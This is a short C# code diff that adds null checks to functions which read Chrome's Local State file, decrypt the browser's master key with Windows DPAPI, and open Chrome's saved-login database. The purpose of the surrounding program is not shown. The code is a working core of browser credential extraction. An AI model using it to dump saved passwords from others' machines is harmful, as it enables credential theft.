@@ -52,26 +52,31 @@ foreach (var folder in folders)
 	}
 }
 
-byte[] GetSecretKey()
+byte[]? GetSecretKey()
 {
 	try
 	{
 		var textJson = File.Open(StoragePath, FileMode.Open);
 		var objectJson = JsonSerializer.Deserialize<LocalState>(textJson);
-		var secretkey = Convert.FromBase64String(objectJson!.OsCrypt.EncryptedKey);
+		if (objectJson == null 
+			|| objectJson.OsCrypt == null
+			|| string.IsNullOrWhiteSpace(objectJson.OsCrypt.EncryptedKey))
+			throw new Exception();
+
+		var secretkey = Convert.FromBase64String(objectJson.OsCrypt.EncryptedKey);
 		secretkey = secretkey[5..];
 		secretkey = ProtectedData.Unprotect(secretkey, null, DataProtectionScope.CurrentUser);
 		return secretkey;
 	}
 	catch
 	{
-		throw new Exception();
+		return null;
 	}
 
 }
 
 
-static SQLiteConnection GetDbConnection(string chromePathLoginDb)
+static SQLiteConnection? GetDbConnection(string chromePathLoginDb)
 {
 	try
 	{
